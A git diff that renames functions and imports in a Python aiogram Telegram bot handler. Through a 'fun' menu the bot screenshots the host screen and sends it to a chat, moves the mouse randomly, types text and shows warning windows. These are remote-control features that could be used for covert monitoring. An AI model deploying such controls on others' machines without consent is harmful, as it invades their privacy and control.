@@ -1,9 +1,9 @@
-from Handlers import Funcs
-from Keyboardz.KeyboardFun import *
+from Handlers import funcs
+from Keyboardz.keyboard_fun import *
 from aiogram import types, Dispatcher
 from aiogram.dispatcher import FSMContext
-from Handlers.Handlers import bot, dp, id
-from Handlers.State import FunSegment as fs, ReturnMessage
+from Handlers.handlers import bot, dp, id
+from Handlers.state import fun_segment as fs, return_message
 from aiogram.contrib.fsm_storage.memory import MemoryStorage
 from aiogram.dispatcher.filters.state import State, StatesGroup
 from aiogram.types import ReplyKeyboardRemove, ReplyKeyboardMarkup
@@ -14,9 +14,9 @@ class statecomand(StatesGroup):
     commandforfun = State()
     zadacha = State()
 
-async def menufun(message: types.Message):
+async def menu_fun(message: types.Message):
     await statecomand.commandforfun.set()
-    await bot.send_message(id, "Глава интересное. Выберите действие", reply_markup=KeyBoardFuns)
+    await bot.send_message(id, "Глава интересное. Выберите действие", reply_markup=keyBoard_funs)
 
 @dp.message_handler(state=statecomand.commandforfun)
 async def fun_command(message: types.Message, state: FSMContext):
@@ -25,12 +25,12 @@ async def fun_command(message: types.Message, state: FSMContext):
         data['choosen'] = message.text
 
     if data['choosen']=="Скриншот экрана":
-        Funcs.Screenshot()
-        photo = open(f'{Funcs.path}/ss.png', 'rb')
+        funcs.screenshot()
+        photo = open(f'{funcs.PATH}/ss.png', 'rb')
         await bot.send_photo(id, photo) 
 
     if (data['choosen'].startswith("Вывод")):
-        await bot.send_message(id, fs(message.text), reply_markup=keyboardwybor)
+        await bot.send_message(id, fs(message.text), reply_markup=keyboard_wybor)
     else:
         await bot.send_message(id, fs(data['choosen']))
     
@@ -48,21 +48,21 @@ async def second(message: types.Message, state: FSMContext):
 
     if(data['choosen'] == "Рандом с мышкой"):
         hren = data['values']
-        Funcs.MouseRand(hren)
-        await bot.send_message(id, ReturnMessage(f"Процесс готово.\n"))
+        funcs.mouse_rand(hren)
+        await bot.send_message(id, return_message(f"Процесс готово.\n"))
 
     elif (data['choosen'] == "Напечатать"):
         hren = data['values']
-        Funcs.WriteText(hren)
-        await bot.send_message(id, ReturnMessage(f"Процесс {data['values']} готово.\n"))
+        funcs.write_text(hren)
+        await bot.send_message(id, return_message(f"Процесс {data['values']} готово.\n"))
     
     elif (data['choosen'] == "Вывод окна"):
         hren = data['values']
-        Funcs.WindowWarning(hren)
-        await bot.send_message(id, ReturnMessage(f"Процесс готово.\n"))
+        funcs.window_warning(hren)
+        await bot.send_message(id, return_message(f"Процесс готово.\n"))
     
     elif (data['choosen'] == "Скриншот экрана"): 
-        await bot.send_message(id, ReturnMessage(f"Выбирайте действие.\n"))
+        await bot.send_message(id, return_message(f"Выбирайте действие.\n"))
         await state.finish()
         
     await state.finish()
@@ -71,6 +71,6 @@ async def second(message: types.Message, state: FSMContext):
         ReplyKeyboardRemove.remove_keyboard
 
 
-def register_Handler_FunCommand(dp: Dispatcher):
-    dp.register_message_handler(menufun, commands=['funfun'])
+def register_handler_fun_command(dp: Dispatcher):
+    dp.register_message_handler(menu_fun, commands=['funfun'])
     
